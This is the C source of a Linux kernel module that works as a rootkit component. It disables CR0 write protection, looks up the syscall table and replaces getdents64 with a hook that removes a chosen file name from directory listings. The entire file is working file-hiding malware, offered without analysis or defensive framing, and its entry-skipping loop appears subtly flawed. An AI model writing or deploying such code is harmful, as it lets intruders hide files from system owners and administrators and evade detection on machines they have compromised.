#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kallsyms.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <stdbool.h>

// Types & other consts.
static char *file_name_to_hide;
module_param(file_name_to_hide, charp, 0600);

typedef int (*original_getdents64_t)(const struct pt_regs *regs);
static original_getdents64_t original_getdents64_ptr;
static unsigned long *syscall_table; 
 
static inline void wp_cr0(unsigned long val) {
    __asm__ __volatile__ ("mov %0, %%cr0": "+r" (val));
}

static inline void disable_write_protect(void) {
    printk(KERN_ALERT "Disabling write protect!");
    wp_cr0(read_cr0() & (~0x10000));
}

static inline void enable_write_protect(void) {
    printk(KERN_ALERT "Enabling write protect...");
    wp_cr0(read_cr0() | 0x10000);
}

int new_getdents64(const struct pt_regs *regs) {
    int total_bytes_read = original_getdents64_ptr(regs);

    if (total_bytes_read > 0) {
        struct linux_dirent64 *buf_pointer = (struct linux_dirent64*)regs->si;
        struct linux_dirent64 *first = kmalloc(total_bytes_read, GFP_KERNEL);

        int copy_res = copy_from_user(first, buf_pointer, (unsigned long)total_bytes_read);
        if (copy_res) {
            printk(KERN_ALERT "Error while copying from user space! error %d", copy_res);
            return total_bytes_read;
        }

        struct linux_dirent64 *curr = first;

        int bytes_left = total_bytes_read;
        bool has_been_found = false;
        while (bytes_left > 0) { 
            bytes_left -= curr->d_reclen;
            curr = (struct linux_dirent64*)(((char*)curr) + curr->d_reclen);

            if (!strcmp(curr->d_name, file_name_to_hide)) {
                has_been_found = true;

                // Array will be shortened by the length of the member we will delete.
                total_bytes_read -= curr->d_reclen;
                bytes_left -= curr->d_reclen;
                
                struct linux_dirent64 *next_pos = (struct linux_dirent64*)(((char*)curr) + curr->d_reclen);
                memmove(curr, next_pos, bytes_left);
                continue;
            }
        }
        
        if (has_been_found) {
            copy_to_user(buf_pointer, first, total_bytes_read);
        }

        kfree(first);
    }

    return total_bytes_read;
}
 
int load(void) {
    if (file_name_to_hide == NULL) {
        printk(KERN_ALERT "File name to hide has not been set! Exiting...");
        return -1;
    }

    printk(KERN_ALERT "Initializing...");
    disable_write_protect();
    syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
    original_getdents64_ptr = (original_getdents64_t)syscall_table[__NR_getdents64];
    syscall_table[__NR_getdents64] = (unsigned long)new_getdents64;
    printk(KERN_ALERT "Overrided getdents64 ptr!");
    enable_write_protect();
    printk(KERN_ALERT "Initialized successfuly!");

    return 0;
}
 
void unload(void) {
    printk(KERN_ALERT "Shutting down.");
    disable_write_protect();
    syscall_table[__NR_getdents64] = (unsigned long)original_getdents64_ptr;  
    printk(KERN_ALERT "getdents64 has been restored!");
    enable_write_protect();
    printk(KERN_ALERT "Goodbye world...");
}

module_init(load);
module_exit(unload);

MODULE_LICENSE("GPL");